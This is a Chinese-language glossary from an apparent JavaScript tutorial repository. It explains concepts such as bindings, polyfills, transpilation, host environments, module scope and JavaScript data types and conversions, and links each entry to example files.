
也见 [Hoisting（变量提升）](#hoisting变量提升)、[Temporal Dead Zone（暂时性死区）](#temporal-dead-zone-tdz暂时性死区)、[const](#const)。

示例：[`02_variables/03_const.js`](02_variables/03_const.js)、[`02_variables/04_hoisting_and_tdz.js`](02_variables/04_hoisting_and_tdz.js)

### Binding（绑定）

绑定是规范术语，指「一个名字与一个存储位置（或值）之间的关联」，通俗说就是「某个标识符当前指向什么」。用「绑定」而不是「变量」来描述 `let`/`const`/`import`/参数/类名，是因为 JS 里很多名字并不对应一块可变的内存槽：`import` 的绑定由被导入模块控制（实时绑定，导出方改值导入方就能看到新值），`const` 的绑定不可改指，函数参数的绑定每轮调用都重新创建。关键细节：**闭包捕获的是绑定而不是值的快照**，所以「每轮迭代一个新绑定」这件事能直接决定闭包行为（`for (let i = ...)` 与 `for (var i = ...)` 的结果差异就源于此）。

**常见误解**：以为「变量 = 一个盒子，里面装着值」。更准确的模型是「名字 → 绑定 → 值」，而绑定本身有可变/不可变之分。

也见 [Variable Declaration（变量声明）](#variable-declaration变量声明)、[Module Scope（模块作用域）](#module-scope模块作用域)。

示例：[`19_modules/07_live_bindings.js`](19_modules/07_live_bindings.js)

### Constant Folding（常量折叠、编译期常量）

常量折叠是编译器／引擎优化技术：在编译期就把「所有操作数都是编译期常量」的表达式**算出结果**，让运行时不再重复计算，例如 `const SECONDS_PER_DAY = 24 * 60 * 60;`、`const x = 2 ** 10;` 都可以在编译期算成常量。在 JS 里这条优化主要由 JIT（如 V8 的 TurboFan）在优化编译阶段完成，并依赖 `const` 或「从不被重新赋值」等推断信息来确认绑定稳定。关键在于：**这是引擎的实现细节，不是语言规范的一部分**——规范并没有规定 `const` 必须被常量折叠，`const` 带来的性能收益是「给引擎更多可依赖的假设」，而不是一个可观测的保证；真正需要编译期常量语义的场景（如 `switch` 的 `case` 标签）要求的是字面量而非 `const` 变量。

**常见误解**：以为「声明了 `const` 就获得了编译期常量」，从而认为可以在需要编译期常量的位置使用 const 变量——那些位置（如 `case` 标签）要求的是字面量。

也见 [Literal（字面量）](#literal字面量)、[const](#const)。

### Entry File（入口文件）

入口文件是「运行一个程序时被首先加载的文件」，它负责启动整个依赖图：Node 执行 `node app.js` 时的 `app.js`、`package.json` 中 `"main"` 或 `"exports"` 指向的文件、打包器（webpack/Vite/Rollup）的 `entry` 配置、以及 HTML 里第一个 `<script type="module" src="...">`。关键细节：入口决定了**模块求值顺序**——被依赖的模块先求值，因此循环依赖在这种顺序下可能表现正常，换一个入口就崩（这正是循环依赖「结果不稳定」的来源）；在 Node 里入口文件还能通过 `import.meta.url` / `process.argv[1]` 判断「自己是不是被直接运行的」，从而实现「既能当库 import、又能当脚本运行」。仓库层面的辅助概念是 barrel 文件（`index.js` 汇总再导出），它常被当作目录的「入口」。

**常见误解**：以为「入口文件是特殊的、带 `main` 函数的文件」。JS 没有 `main` 函数这一约定，入口文件只是**第一个被求值的模块**；模块顶层代码执行完，程序就继续等事件循环了。

也见 [Module Scope（模块作用域）](#module-scope模块作用域)、[Program, Script, and Module（程序、脚本与模块）](#program-script-and-module程序脚本与模块)。

示例：[`19_modules/_barrel.js`](19_modules/_barrel.js)、[`19_modules/15_circular_dependencies.js`](19_modules/15_circular_dependencies.js)

### REPL（Read-Eval-Print Loop，交互式解释器）

REPL 指「读取-求值-打印」循环：你输入一句表达式，它立即求值并把结果打印出来，然后等你输入下一句。Node.js 自带 REPL（终端里直接运行 `node` 即可进入，`.help`、`.exit`、`_` 等是它的元命令），浏览器按 F12 打开的控制台也是一个 REPL。它的价值在于**零成本试错**：想确认 `typeof null` 是什么、`[] + []` 会得到什么，直接敲进去比新建文件快得多。关键细节：REPL 里的顶层 `this`、顶层声明行为与文件／模块**不完全一致**（例如控制台里 `var` 的表现更接近脚本而非 ESM 模块），所以「REPL 里能跑」不等于「模块里能跑」；学习阶段可以把它当成随身草稿纸，但结论要回到真实文件里复核。

也见 [Runtime（运行时）](#runtime运行时)、[Host Environment（宿主环境）](#host-environment宿主环境)。

示例：[`README.md` 的运行方式详解](README.md#运行方式详解)

### ECMAScript（ECMAScript 与 JavaScript 的关系）

ECMAScript 是这门语言的**规范**（由 Ecma International 以 ECMA-262 标准发布），规定语法、类型、内置对象的语义；JavaScript 是这门语言在具体**实现与生态**中的名字（还包含规范之外的宿主 API、工具链与历史包袱）。所以「ES2015/ES2016/ES2020」是规范版本号，说「JS 是 ES2022 版」是不成立的表述。关键细节：**JS 里不存在可查询、可声明的「语言版本」**——与 Java 的 `--release 17`、Python 的 `python_requires` 不同，一个引擎可以只实现某版规范的一部分，也可以提前实现尚在提案阶段的特性，所以只能用**特性检测**（而不是版本号）来判断能力。此外规范还分「已定稿」与提案阶段（Stage 0~4），新语法在被正式纳入前通常需要转译才能上线。

**常见误解**：从 Java/Python 过来的人常以为存在「引擎的版本号 → 支持的特性清单」这种映射，从而写出依赖版本号判断的代码——这在 JS 世界里从根上就是错的思路。

也见 [Feature Detection（特性检测）](#feature-detection特性检测)、[Transpilation（转译）](#transpilation转译)、[Host Environment（宿主环境）](#host-environment宿主环境)。

示例：[`01_syntax_basics/06_language_versions_and_compatibility.js`](01_syntax_basics/06_language_versions_and_compatibility.js)

### Feature Detection（特性检测）

特性检测是判断「当前运行环境到底支持不支持某个能力」的通用手段：直接检测该能力是否存在或行为是否符合预期，而不是依赖版本号猜测。几种粒度：检测对象/方法是否存在（`typeof Array.prototype.at === 'function'`、`'structuredClone' in globalThis`）、检测行为而不只是存在（早期浏览器里同名方法行为有差异）、以及检测某个**语法**是否可解析（语法无法用运行时检测，必须靠构建阶段的解析器或 `try { new Function(...) }` 之类的技巧）。关键细节：凡是新增的宿主或语言特性，本仓库都采用特性检测 + 降级分支的写法，保证在低版本 Node 上也能跑到最后，而不是直接崩溃。

**常见误解**：以为「`typeof x !== 'undefined'` 就能检测一切」——它能测全局对象上的属性，对 TDZ 中的 `let` 会抛错，对**语法特性**更是完全无能为力。

也见 [Polyfill（垫片）](#polyfill垫片)、[ECMAScript（ECMAScript 与 JavaScript 的关系）](#ecmascriptecmascript-与-javascript-的关系)。

示例：[`01_syntax_basics/06_language_versions_and_compatibility.js`](01_syntax_basics/06_language_versions_and_compatibility.js)

### Polyfill（垫片）

Polyfill 指「用当前环境已有的能力，把缺失的新 API 补上」的一段代码，让旧环境看起来像支持新特性：例如给旧引擎补一个 `Array.prototype.includes`、`Object.fromEntries`、`globalThis` 或 `Promise.finally`。关键细节：polyfill **只能补运行时 API，补不了新语法**（因为旧引擎的解析器根本读不懂新语法）；补的方式通常是在原型或全局对象上添加属性，因此可能与未来标准冲突、也可能覆盖已有实现（所以成熟库都先做特性检测再决定是否安装）；另外 polyfill 有「代码体积」与「污染全局」的代价，现代做法常配合按需加载，而不是无脑引一个大而全的垫片包。

**常见误解**：以为引一个 polyfill 就能用上新语法。语法层面的兼容要靠转译，polyfill 只管 API。

也见 [Feature Detection（特性检测）](#feature-detection特性检测)、[Transpilation（转译）](#transpilation转译)。

示例：[`01_syntax_basics/06_language_versions_and_compatibility.js`](01_syntax_basics/06_language_versions_and_compatibility.js)

### Transpilation（转译）

转译（transpile = translate + compile）指把一种高级语法**转换成等价的低版本写法**，让旧引擎也能解析执行，例如把箭头函数、`class`、可选链 `?.`、`async/await` 降级成 ES5 能懂的代码；常见工具是 Babel、TypeScript 编译器（`target` 设置）以及各种构建工具的内置转译。它与 polyfill 是互补的两条腿：**转译解决语法，polyfill 解决 API**。关键细节：转译会带来代价——输出代码通常更长更慢，还可能需要辅助函数（`_extends`、`regeneratorRuntime`）、需要 source map 才能调试，并且**语义并非总能完全等价**（例如依赖 `new.target` 或 `Symbol.hasInstance` 的行为很难完美降级）。因此「要不要转译」取决于目标环境：如果只跑在现代 Node 上，往往可以直接不转译。

**常见误解**：以为「用了 Babel 就万事大吉」——某些新 API 仍然需要 polyfill，某些语义在新旧目标下无法完全一致。

也见 [Polyfill（垫片）](#polyfill垫片)、[Feature Detection（特性检测）](#feature-detection特性检测)。

示例：[`01_syntax_basics/06_language_versions_and_compatibility.js`](01_syntax_basics/06_language_versions_and_compatibility.js)

### Host Environment（宿主环境）

宿主环境是「承载 JS 引擎并给它提供额外 API 的那个外部系统」，常见的有浏览器、Node.js、Deno、Bun、Web Worker、嵌入式 JS 引擎。语言本身（语法、类型、闭包、原型链）在各宿主中是同一套，差异只体现在**宿主注入的全局 API** 与**模块系统**上：浏览器注入 DOM/BOM（`window`、`document`、`location`、`localStorage`），Node.js 注入服务端能力（`process`、`fs`、`Buffer`、`require`、`__dirname`）。关键细节：`console`、`setTimeout`、`fetch`、`URL` 都属于宿主 API 而不是语言规范，这就是「浏览器能跑、Node 报 `document is not defined`」的根因；分清界线才能写出跨宿主可运行（同构）的代码，并快速定位环境类错误。

**常见误解**：把「我本机能跑」当作「代码没问题」——换宿主或换版本就可能拿不到某个 API；也以为 `console.log` 是语言的一部分，其实它是宿主注入的。

也见 [Runtime（运行时）](#runtime运行时)、[Global Object（全局对象）](#global-object全局对象)、[console（控制台对象）](#console控制台对象)。

示例：[`00_hello_world/04_node_vs_browser.js`](00_hello_world/04_node_vs_browser.js)、[`00_hello_world/03_hello_world_in_browser.html`](00_hello_world/03_hello_world_in_browser.html)

### Runtime（运行时）

运行时指「让 JS 代码真正跑起来的整套设施」：JS 引擎（V8、SpiderMonkey、JavaScriptCore）、初始化阶段（创建全局对象、建立内置对象）、以及宿主的 I/O 与事件循环。日常语境里说「运行时」常常特指 **Node.js**——它是把 V8 引擎剥离出来、再加上文件系统／网络／进程等能力后形成的运行环境，因此「JS 是语言，Node.js 是运行时」是一句非常常用的对仗。关键细节：现代引擎都是「解释执行 + JIT 编译」的混合体（先解释或基线编译，热点代码再优化编译），所以「JS 是解释型语言」只是粗略说法；另外运行时版本会决定你能直接用哪些 API，这是本仓库做特性检测与降级的原因。

**常见误解**：把「语言」和「运行时」混为一谈（例如说「Node 的语法」）；也以为装了 Node 就装上了某个固定版本的 JS 语言——语言由引擎实现程度决定，没有版本号可查。

也见 [Host Environment（宿主环境）](#host-environment宿主环境)、[ECMAScript（ECMAScript 与 JavaScript 的关系）](#ecmascriptecmascript-与-javascript-的关系)。

示例：[`00_hello_world/01_hello_world.js`](00_hello_world/01_hello_world.js)、[`00_hello_world/04_node_vs_browser.js`](00_hello_world/04_node_vs_browser.js)

### console（控制台对象）

`console` 不是 ECMAScript 的一部分，而是**宿主环境注入的全局对象**，提供一组输出与调试 API：`log`/`info`（stdout）、`warn`/`error`（stderr）、`table`（表格化展示）、`dir`（对象视角、可控制展开深度）、`time`/`timeEnd`（计时，标签必须配对）、`group`/`groupEnd`（缩进分组）、`assert`（条件为假才打印）、`count`/`countReset`，还支持 `%s`、`%d`、`%o`、`%j`、`%c` 等格式化占位符。关键细节：因为由宿主提供，浏览器控制台有面板分组、可折叠对象等 UI 能力，而 Node 只是往两个流里写字；两者在「打印对象」上也有差异——浏览器的展开是**引用**、看到的是当前时刻的值，Node 的终端输出则是即时快照。另外 `console.assert` **不会中断程序**，也别把「没有输出」误解为断言通过。

**常见误解**：以为 `console.log` 是语言内置能力（因此在任何环境都可用）——它是宿主 API；也以为 `console.assert` 会像断言库那样抛错。

也见 [Host Environment（宿主环境）](#host-environment宿主环境)、[REPL（交互式解释器）](#replread-eval-print-loop交互式解释器)。

示例：[`00_hello_world/02_console_methods.js`](00_hello_world/02_console_methods.js)

### Module Scope（模块作用域）

模块作用域是 ESM 给每个文件额外加的一层顶层作用域：文件顶层声明的 `var`/`let`/`const`/`function`/`class` **都只属于本模块**，既不会变成 `globalThis` 的属性，也不会和其它模块冲突；模块顶层的 `this` 是 `undefined`（对比 CJS 里顶层 `this` 恰好是 `module.exports`）；并且一个模块无论被 `import` 多少次都**只会被求值一次**，之后所有导入方共享同一份实例与状态。这套规则带来两个直接收益：脚本时代「所有 `<script>` 共用一个全局作用域、重名即互相覆盖」的问题彻底消失；「只执行一次」的保证让模块天然适合承载单例状态（配置、连接池、缓存），不必再写 `if (!globalThis.x)` 之类的兜底。

**常见误解**：以为「模块里写顶层 `var` 会在 `globalThis` 上看到」，或者以为「多次 import 会多次执行模块顶层代码」——都不会。

也见 [Program, Script, and Module（程序、脚本与模块）](#program-script-and-module程序脚本与模块)、[Global Variable（全局变量）](#global-variable全局变量)。

示例：[`19_modules/08_module_scope.js`](19_modules/08_module_scope.js)

---

## 数据类型与类型系统

本册对应 `03_data_types` 目录，覆盖 JS 的值分类、类型判定、类型转换与相等性判定。核心结论只有一句：**JS 只有两大类值 —— 7 种原始值 + 对象**，理解了「值语义 vs 引用语义」，本册 80% 的坑都能自己推出来。

### Primitive Value（原始值）

原始值是不可再分的"最小数据单位"，本质上是**按值存储与传递**：复制变量时复制的是值本身，两份数据从此互不影响。ES2020 之后共 7 种：`string`、`number`、`boolean`、`null`、`undefined`、`symbol`、`bigint`。它们不可变（immutable），任何"修改"都是造新值。**常见误解**：原始值"没有属性"是对的，但 `'abc'.length` 之所以能跑，是因为引擎临时装箱（见「Wrapper Object」），并非字符串真有属性。

示例：[`03_data_types/01_primitives_overview.js`](03_data_types/01_primitives_overview.js)

### Reference Type（引用类型）

引用类型即对象（Object），变量里存的不是数据本身，而是一个指向堆内存的**地址（引用）**。因此 `const a = {x:1}; const b = a;` 后，`a === b` 为 `true`，改 `b.x` 会连带改到 `a.x`。**常见误解**：`===` 比较两个对象时比的是"是不是同一个引用"，而不是"内容是否相同"，所以 `{} === {}`、`[] === []` 恒为 `false`，内容比较必须自己写（或 `JSON.stringify` / 结构化比较）。也见「Value Semantics vs Reference Semantics」。

示例：[`03_data_types/01_primitives_overview.js`](03_data_types/01_primitives_overview.js)

### Seven Primitive Types（七种原始类型）

完整的 7 种原始类型是：`string`、`number`、`boolean`、`null`、`undefined`、`symbol`（ES6）、`bigint`（ES2020）。除这 7 种之外的一切值都是对象 —— 包括数组、函数、`Date`、`RegExp`、`Map`、`Set`、`Promise`，以及包装对象。**常见误解**："数组是一种类型"是错的，`typeof []` 是 `'object'`；函数虽也是对象，但 `typeof f` 特例返回 `'function'`。

示例：[`03_data_types/01_primitives_overview.js`](03_data_types/01_primitives_overview.js)

### Object Type（对象类型）

对象是"属性的集合"，是 JS 中唯一的复合数据结构，也是唯一的引用类型。判断一个值是否为对象的标准手法是 `v !== null && (typeof v === 'object' || typeof v === 'function')` —— 必须排除 `null`，因为 `typeof null === 'object'`。对象还分"普通对象"与"特殊对象"（数组、函数、日期、正则、`Map`、`Set` 等），后者由内建原型提供额外行为。

示例：[`03_data_types/01_primitives_overview.js`](03_data_types/01_primitives_overview.js)

### Wrapper Object（包装对象）与自动装箱

`String`、`Number`、`Boolean` 这三个构造函数既能做类型转换（`Number('1')`），也能用 `new` 创建**包装对象**（`new Number(1)`），后者是货真价实的对象，`typeof new Number(1) === 'object'`。而当我们对原始值取属性（`'abc'.length`）时，引擎会临时创建一个包装对象、取完属性立刻丢弃，这叫**自动装箱（auto-boxing）**。**常见误解**：`new Boolean(false)` 是**真值**（因为它是个非空对象），条件判断里永远成立 —— 所以永远不要用 `new` 版包装对象。

示例：[`03_data_types/07_boolean_type.js`](03_data_types/07_boolean_type.js)

### typeof Operator（typeof 运算符）

`typeof` 是一元**运算符**（不是函数，`typeof(x)` 只是括号表达式），返回 8 个字符串之一：`'undefined'`、`'object'`、`'boolean'`、`'number'`、`'bigint'`、`'string'`、`'symbol'`、`'function'`。它最重要的特性是：对**未声明的变量**使用 `typeof` 不会抛 `ReferenceError`，返回 `'undefined'`，因此常用于功能探测（feature detection）；但若该名字是用 `let`/`const` 声明且正处于 TDZ，仍会抛错。**常见误解**：`typeof null === 'object'`（历史 bug，见「Type Tag」）、`typeof NaN === 'number'`、`typeof [] === 'object'`。也见「instanceof Operator」。

示例：[`03_data_types/02_typeof_operator.js`](03_data_types/02_typeof_operator.js)

### Type Tag（类型标签）

类型标签指 JS 早期实现中"用低位标记表示类型"的做法：对象标签为 `000`，而 `null` 被表示为全零空指针，标签恰好也是 `000`，于是 `typeof null` 被误判为 `'object'`。这个 1995 年留下的 bug 因会破坏大量既有网页代码而被规范将错就错保留至今。现代想拿精确类型标签，可用 `Object.prototype.toString.call(v)`（得到 `'[object Array]'` 这类字符串，可被 `Symbol.toStringTag` 定制）。**常见误解**：`typeof null === 'object'` 不是"null 是对象"，只是历史包袱。

示例：[`03_data_types/02_typeof_operator.js`](03_data_types/02_typeof_operator.js)

### instanceof Operator（instanceof 运算符）

`a instanceof B` 检查 `B.prototype` 是否出现在 `a` 的原型链上，因此它只对**对象**有意义。**常见误解**：`1 instanceof Number` 是 `false`（原始值不在任何原型链上，只有 `new Number(1)` 才是）；`Object.create(null)` 创建的无原型对象对它永远返回 `false`；跨 iframe / 跨 realm 的对象会因构造函数不同而判定失败。它的行为可被 `Symbol.hasInstance` 定制，是"品牌检查（brand check）"的一种。也见「typeof Operator」「Duck Typing」。

示例：[`03_data_types/02_typeof_operator.js`](03_data_types/02_typeof_operator.js)、[`14_classes/09_instanceof_and_brands.js`](14_classes/09_instanceof_and_brands.js)

### Explicit Conversion（显式类型转换）

显式转换是开发者主动调用转换函数，让意图清晰可见：`Number(x)`、`String(x)`、`Boolean(x)`，以及 `parseInt` / `parseFloat`、一元 `+x`、`!!x`、`x.toString()`、`BigInt(x)`。工程共识是"宁可多写几个 `Number()`，也不要依赖隐式转换"，因为隐式规则的例外太多。转换失败的信号不同：`Number('abc')` 静默给 `NaN`，`Symbol` 转数字直接抛 `TypeError`，`BigInt(1.5)` 抛 `RangeError` —— **错误越容易被忽略，越应该主动校验**。也见「Implicit Conversion / Coercion」。

示例：[`03_data_types/03_type_conversion.js`](03_data_types/03_type_conversion.js)

### Implicit Conversion / Coercion（隐式转换 / 强制转换）

引擎在运算符两侧类型不一致时**自动**做的转换，是 JS 最容易被诟病、也最容易出错的地方。规则可归纳为：`+` 只要有字符串就转字符串拼接，否则转数字；`==` 在两侧类型不同时按固定算法转换（如 `null == undefined` 为 `true`、`'1' == 1` 为 `true`）；而 `===` 不做任何转换。理解它的价值在于**知道什么时候必须用 `===`**，而不是把所有隐式转换都当洪水猛兽。**常见误解**：`'5' - 1` 得到 `4`（`-` 只做数字运算），但 `'5' + 1` 得到 `'51'`。

示例：[`03_data_types/03_type_conversion.js`](03_data_types/03_type_conversion.js)

### ToString / ToNumber / ToBoolean（抽象操作）

这三个是规范内部定义的转换算法（首字母大写表示"抽象操作"，代码里不能直接调用），所有显式与隐式转换最终都落到它们身上。`ToNumber`：`''`→`0`、`'12abc'`→`NaN`、`null`→`0`、`undefined`→`NaN`、`true`→`1`、对象先 `ToPrimitive`；`ToString`：`null`→`'null'`、`NaN`→`'NaN'`、`[1,[2,3]]`→`'1,2,3'`、`{}`→`'[object Object]'`、`Symbol` 需显式调用 `String()`；`ToBoolean`：只认 8 个假值（见「Truthy / Falsy」）。其中 `null → 0` 与 `undefined → NaN` 的不对称是很多 bug 的源头。

示例：[`03_data_types/03_type_conversion.js`](03_data_types/03_type_conversion.js)

### ToPrimitive（抽象操作）

当对象需要参与原始值运算（如 `+`、`==`、`Number(obj)`）时，引擎调用 `ToPrimitive` 把对象"降级"成一个原始值。默认顺序是**先 `valueOf()` 再 `toString()`**（`Date` 是特例，先 `toString()`），两者都返回对象则抛 `TypeError`。对象可以自定义 `[Symbol.toPrimitive](hint)` 完全接管这个过程（`hint` 为 `'number'` / `'string'` / `'default'`）。**常见误解**：`{} + []` 得到 `'[object Object]'`、`[] + {}` 也得到 `'[object Object]'`，但 `[] + []` 是 `''`、`[1,2] + [3]` 是 `'1,23'` —— 结果由 `ToPrimitive` 与 `+` 的双重语义共同决定。

示例：[`03_data_types/03_type_conversion.js`](03_data_types/03_type_conversion.js)、[`03_data_types/09_symbol_type.js`](03_data_types/09_symbol_type.js)

### Number() 转换

`Number(x)` 是**严格转换**：整个字符串必须是合法数字，否则得 `NaN`；它不做前缀解析，`Number('12px')` 是 `NaN`（对比 `parseInt('12px')` 得 `12`）。关键映射：`''` 与纯空白 → `0`、`null` → `0`、`undefined` → `NaN`、`true` → `1`、`false` → `0`、`0x1F` → `31`。**常见误解**：`Number([])` 是 `0`（`[]` → `''` → `0`），`Number([5])` 是 `5`，但 `Number([1,2])` 与 `Number({})` 都是 `NaN`。

示例：[`03_data_types/03_type_conversion.js`](03_data_types/03_type_conversion.js)

### String() 转换

`String(x)` 把任意值转成字符串，与模板字符串 `${x}` 走的都是 `ToString`。要点：`String(null)` 是 `'null'`、`String(undefined)` 是 `'undefined'`、`String(-0)` 是 `'0'`、数组按元素转字符串后用逗号拼接。**常见误解**：`String(sym)` 是**允许**的（返回 `'Symbol(描述)'`），而 `'' + sym`、`` `${sym}` `` 会抛 `TypeError` —— 规范特意允许显式转换、禁止隐式转换，用于提前暴露类型错误。

示例：[`03_data_types/03_type_conversion.js`](03_data_types/03_type_conversion.js)

### Boolean() 转换

`Boolean(x)` 与 `!!x` 完全等价，都走 `ToBoolean`，只判断"是不是 8 个假值之一"。**常见误解**：`Boolean('false')` 与 `Boolean('0')` 都是 `true`（非空字符串恒为真），表单与 URL 参数拿到的永远是字符串，必须显式比较或转换；`Boolean([])`、`Boolean({})` 也都是 `true`，判断空数组要用 `arr.length === 0`。也见「Truthy / Falsy」。

示例：[`03_data_types/07_boolean_type.js`](03_data_types/07_boolean_type.js)、[`03_data_types/10_truthy_falsy.js`](03_data_types/10_truthy_falsy.js)

### parseInt / parseFloat（解析型转换）

`parseInt(s, radix)` 与 `parseFloat(s)` 是**解析型**方法：从左侧逐字符读取，遇到第一个不能组成数字的字符就停下并返回已解析部分，所以 `parseInt('12px')` 得 `12`、`parseFloat('3.14abc')` 得 `3.14`；若第一个字符就非法则返回 `NaN`。核心实践：**永远显式传第二个参数 `radix`**，`parseInt('08')` 在老引擎里可能被当八进制；`parseInt` 遇 `0x` 前缀会按 16 进制解析，且它接受 `Infinity` 却返回 `NaN`。**常见误解**：`parseInt` 只返回整数，`parseInt(1.9)` 是 `1`；`Number()` 严格而 `parseInt` 宽松，用哪个取决于你要"校验"还是"容错提取"。

示例：[`12_numbers_and_math/04_parseint_parsefloat.js`](12_numbers_and_math/04_parseint_parsefloat.js)、[`03_data_types/03_type_conversion.js`](03_data_types/03_type_conversion.js)

### NaN（Not a Number，非数字）

`NaN` 表示"一次无效的数值运算的结果"（如 `0/0`、`Number('abc')`、`Math.sqrt(-1)`），它**仍然是 `number` 类型**（`typeof NaN === 'number'`）。最反直觉的性质是 **NaN 不等于任何值，包括它自己**（`NaN === NaN` 为 `false`），因此判断必须用 `Number.isNaN(v)` 或 `Object.is(v, NaN)`。**常见误解**：用 `v === NaN` 判断永远失败；`NaN` 参与任何算术都得 `NaN`，且 `[NaN].indexOf(NaN)` 是 `-1`（`indexOf` 用 `===`），但 `[NaN].includes(NaN)` 是 `true`（用 SameValueZero）。也见「Number.isNaN vs 全局 isNaN」。

示例：[`03_data_types/04_number_type.js`](03_data_types/04_number_type.js)

### Number.isNaN vs 全局 isNaN

`Number.isNaN(v)` 只在 `v` **本身就是 `NaN`** 时返回 `true`，不做任何类型转换；全局 `isNaN(v)` 会先执行 `Number(v)`，于是 `isNaN('abc')`、`isNaN(undefined)`、`isNaN({})` 全是 `true`，连 `isNaN('')` 也是 `false`（`''` → `0`）。**常见误解**：把全局 `isNaN` 当"是不是 NaN"用是错的，它回答的其实是"转成数字后是不是 NaN"。同理，全局 `isFinite('123')` 是 `true` 而 `Number.isFinite('123')` 是 `false`（不做转换）。判断"能不能当数字用"的稳妥写法是 `typeof v === 'number' && !Number.isNaN(v)`。

示例：[`03_data_types/04_number_type.js`](03_data_types/04_number_type.js)

### Infinity（无穷大）

`Infinity` 是超出双精度表示范围的溢出结果，`1/0` 得到 `Infinity` 而不抛错（与多数语言不同），`-1/0` 得到 `-Infinity`，`Number.MAX_VALUE * 2` 也溢出成 `Infinity`。它的运算是"近似无穷"：`Infinity + 1 === Infinity`、`Infinity * 0` 和 `Infinity - Infinity` 都是 `NaN`。`Number.isFinite(v)` 只对有限数字返回 `true`（不做转换），是校验数值输入的常用关卡。**常见误解**：`Infinity` 是 `number` 类型，`JSON.stringify(Infinity)` 会变成 `null`（JSON 不支持无穷）。

示例：[`03_data_types/04_number_type.js`](03_data_types/04_number_type.js)

### -0（Negative Zero，负零）

IEEE 754 有正零与负零两个零，`-0` 由 `-0`、`-1 * 0`、`0 / -1` 等产生。它在**几乎所有**场合表现得与 `+0` 一样：`0 === -0` 为 `true`，`String(-0)` 是 `'0'`，`-0` 当属性键会被转成 `'0'` 而与 `0` 冲突。唯一能区分它们的是 `Object.is(0, -0) === false` 和 `1 / -0 === -Infinity`。**常见误解**：`-0` 不是 `NaN`，也不是"特殊对象"；它一般在"符号有意义"的场合才重要（如表示极限方向），业务代码里几乎无需特判。也见「Object.is」。

示例：[`03_data_types/04_number_type.js`](03_data_types/04_number_type.js)

### IEEE 754 Double Precision（双精度浮点）

JS 的 `number` 遵循 IEEE 754 双精度 64 位标准：1 位符号 + 11 位指数 + 52 位尾数（实际有效精度 53 位），整数与小数共用同一类型。这意味着能精确表示的整数范围只有 ±(2^53 - 1)，且二进制无法精确表示 `0.1`、`0.2` 这类十进制小数（类似十进制无法精确表示 1/3）。**常见误解**：`0.1 + 0.2 !== 0.3` 不是 JS 的 bug，而是所有采用该标准的语言（Java、Python、C）共有现象；`1 - 0.9 !== 0.1` 同理。

示例：[`03_data_types/04_number_type.js`](03_data_types/04_number_type.js)

### Floating-Point Precision（浮点精度问题）

浮点比较不要在 `===` 上做，正确姿势是比较差值是否小于一个极小量（epsilon），即 `Math.abs(a - b) < Number.EPSILON`。**常见误解**：用 `toFixed(2)` 只解决"显示"，`(0.1 + 0.2).toFixed(2)` 得到 `'0.30'` 但值本身仍是 `0.30000000000000004`；金额计算应改用整数分（`Math.round(x * 100)`）、`BigInt` 或专门的十进制库，而不是指望浮点"凑对"。

示例：[`03_data_types/04_number_type.js`](03_data_types/04_number_type.js)

### Number.MAX_SAFE_INTEGER / MIN_SAFE_INTEGER（安全整数）

安全整数区间是 `Number.MIN_SAFE_INTEGER`（`-(2^53 - 1)` = `-9007199254740991`）到 `Number.MAX_SAFE_INTEGER`（`2^53 - 1` = `9007199254740991`），在此区间内整数与浮点数一一对应。超出后相邻整数可能映射到同一个值（`2**53 === 2**53 + 1` 为 `true`），此时必须用 `BigInt`。用 `Number.isSafeInteger(v)` 做校验，注意它同时要求 `typeof v === 'number'`。**常见误解**：这个上限与"位数"无关，也与时区无关；从 JSON 里读 19 位 ID 会静默丢精度，必须用字符串传输。

示例：[`03_data_types/04_number_type.js`](03_data_types/04_number_type.js)

### Number.EPSILON

`Number.EPSILON` 是 `1` 与"大于 1 的最小可表示数"之间的差值，约 `2.220446049250313e-16`，也就是双精度下的"最小可分辨间隙"。它最常见的用途是给浮点相等提供容差：`Math.abs(a - b) < Number.EPSILON`。**常见误解**：`EPSILON` 不是"通用的比较容差"，数值量级较大时（如 `1e10`）它已远小于该数量级下的表示间隙，此时应改用相对误差 `Math.abs(a-b) <= Number.EPSILON * Math.max(Math.abs(a), Math.abs(b))`。

示例：[`03_data_types/04_number_type.js`](03_data_types/04_number_type.js)

### BigInt（任意精度整数）

`BigInt` 是 ES2020 引入的第 7 种原始类型，表示任意精度整数，`typeof 1n === 'bigint'`，代价是比 `number` 慢。关键约束：**`BigInt` 与 `number` 不能混算**，`1n + 1` 抛 `TypeError: Cannot mix BigInt and other types`；除法向零截断（`7n / 2n === 3n`），`1n / 0n` 抛 `RangeError`（而 `1/0` 是 `Infinity`）。比较方面，关系运算 `<、>` 与松散相等 `==` 允许混用（`1n == 1` 为 `true`），但 `===` 与 `Object.is` 判为不等（类型不同）。**常见误解**：`BigInt` 没有小数，`1.5n` 是语法错误，`BigInt(1.5)` 抛 `RangeError`；用它存雪花 ID 是标准做法。

示例：[`03_data_types/05_bigint.js`](03_data_types/05_bigint.js)

### n Suffix（n 后缀）

在整数字面量后加 `n` 即得 `BigInt`：`9007199254740993n`、`0x1Fn`、`0b1010n`、`0o17n` 都合法，`n` 也只能跟在**整数**字面量后面。**常见误解**：`1.5n`、`1e3n` 都是语法错误；`n` 后缀与 `Number` 的 `e` 科学计数法不能混用；从 `JSON.parse` 得到的数据永远不会是 `BigInt`（JSON 没有该类型），必须自己转换。

示例：[`03_data_types/05_bigint.js`](03_data_types/05_bigint.js)

### Symbol（符号）

`Symbol` 是 ES6 引入的第 6 种原始类型，表示**独一无二且不可变**的值，每次调用 `Symbol('描述')` 都创建全新值，描述只是给人看的。主要用途是**属性键**：避免不同库给同一对象打标记时互相覆盖，并实现"半私有"成员（不出现在 `Object.keys` / `for...in` / `JSON.stringify` 中，但 `Object.getOwnPropertySymbols` / `Reflect.ownKeys` 能拿到）。**常见误解**：`Symbol('a') === Symbol('a')` 是 `false`；`new Symbol()` 会抛 `TypeError`（它不是构造函数）；`Symbol` 不能隐式转字符串或数字（`'' + sym` 抛错），但 `String(sym)` 可以。也见「Symbol.for」。

示例：[`03_data_types/09_symbol_type.js`](03_data_types/09_symbol_type.js)

### Well-known Symbols（内置符号）

语言自身使用的一组内置 `Symbol`，充当"元编程钩子"：`Symbol.iterator`（定义 `for...of` / 展开）、`Symbol.asyncIterator`、`Symbol.toPrimitive`（接管隐式转换）、`Symbol.toStringTag`（定制 `Object.prototype.toString` 的标签）、`Symbol.hasInstance`（接管 `instanceof`）、`Symbol.species`、`Symbol.isConcatSpreadable`、`Symbol.match/replace/search/split`。实现其中任意一个，自定义对象就能"接入"语言机制。**常见误解**：它们是**共享**的同一批值（`Symbol.iterator === Symbol.iterator` 恒为 `true`），不是每次访问新建；它们也永远不会与用户创建的 `Symbol()` 冲突。

